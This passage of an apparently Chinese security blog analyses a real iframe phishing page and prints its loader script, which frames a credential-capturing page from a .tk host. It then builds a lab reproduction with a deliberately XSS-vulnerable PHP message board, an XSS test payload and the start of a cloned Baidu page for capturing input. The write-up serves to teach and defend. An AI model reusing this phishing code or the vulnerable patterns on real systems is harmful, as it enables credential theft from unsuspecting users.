class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<ul>
+<li>str=window.location.href是获取当前url赋值给str</li>
+<li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li>
+<li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li>
+</ul>
+<p>前面我们已经知道windows.location.href是<a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p>
+<p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p>
+<p>然后整个页面的结果就是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb"</span> <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p>
+<p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing05.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing06.png" alt=""></p>
+<p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p>
+<p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p>
+<p>百科中是这样说的：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing07.png" alt=""></p>
+<p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p>
+<p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing08.png" alt=""></p>
+<h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p>
+<p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p>
+<h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p>
+<p>其中message.php负责输入留言和展示留言，代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:500px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"text-align:left;"</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">昵&amp;nbsp&amp;nbsp称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">留&amp;nbsp&amp;nbsp言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,"select `name`, `message` from mess;");</span><br><span class="line"></span><br><span class="line">while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo "&lt;hr&gt;&lt;br&gt;Name: " . urldecode($row["name"]). "&lt;br&gt;  Message: " . urldecode($row["message"]). "&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;";</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name = urlencode($_REQUEST['name']);</span><br><span class="line">$message = urlencode($_REQUEST['message']);</span><br><span class="line">echo '&lt;br&gt;';</span><br><span class="line"></span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($name&amp;&amp;$message)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	mysqli_query($con,"INSERT INTO `mess` (`name`, `message`) VALUES ('".$name."', '".$message."');");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo '&lt;script language="javascript"&gt;';</span><br><span class="line">echo "location.href='./message.php'";</span><br><span class="line">echo '&lt;/script&gt;';</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后我们发现输入正常留言可以显示出来：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing09.png" alt=""></p>
+<p>构造一个xss代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>也可以正常运行，证明存在存储型xss：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing10.png" alt=""></p>
+<h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p>
+<p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> 	.dd&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.dd a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.aa a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: #000000;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	font-size: 15px;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	body&#123;</span></span><br><span class="line"><span class="undefined"> 	margin: 0;</span></span><br><span class="line"><span class="undefined"> 	padding: 0;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	font:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	color: red;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.back-img&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 100%;</span></span><br><span class="line"><span class="undefined"> 	top: 0px;</span></span><br><span class="line"><span class="undefined"> 	left: 0px;</span></span><br><span class="line"><span class="undefined"> 	background-color: #000000;</span></span><br><span class="line"><span class="undefined"> 	opacity: 0.3;</span></span><br><span class="line"><span class="undefined"> 	z-index: 100;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	width: 390px;</span></span><br><span class="line"><span class="undefined"> 	height: 500px;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	top:26%;</span></span><br><span class="line"><span class="undefined"> 	left: 35%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	z-index: 110;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top&#123;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 10%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login&#123;</span></span><br><span class="line"><span class="undefined"> 	display: block;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	right: 10px;</span></span><br><span class="line"><span class="undefined"> 	top: 5px;</span></span><br><span class="line"><span class="undefined"> 	width: 30px;</span></span><br><span class="line"><span class="undefined"> 	height: 30px;</span></span><br><span class="line"><span class="undefined"> 	text-align: center;</span></span><br><span class="line"><span class="undefined"> 	line-height: 30px;</span></span><br><span class="line"><span class="undefined"> 	font-size: 30px;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid gray;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: move;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	 </span></span><br><span class="line"><span class="undefined"> 	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"800px"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"10%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"aa"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>学术<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">font</span> <span class="attr">class</span>=<span class="string">"tt"</span> <span class="attr">onclick</span>=<span class="string">"login()"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>设置&amp;nbsp;&amp;nbsp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/baidu001.gif"</span> <span class="attr">width</span>=<span class="string">"270px"</span> <span class="attr">height</span>=<span class="string">"129px"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>	</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"baidu.php"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">style</span>=<span class="string">"width: 540px;height: 36px;font-size: 20px;"</span>/&gt;</span></span><br><span class="line"> 	<span class="comment">&lt;!-- &lt;img src="image/camera#.png" /&gt; --&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;"</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>手机百度<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>把百度设为主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>百度推广<span 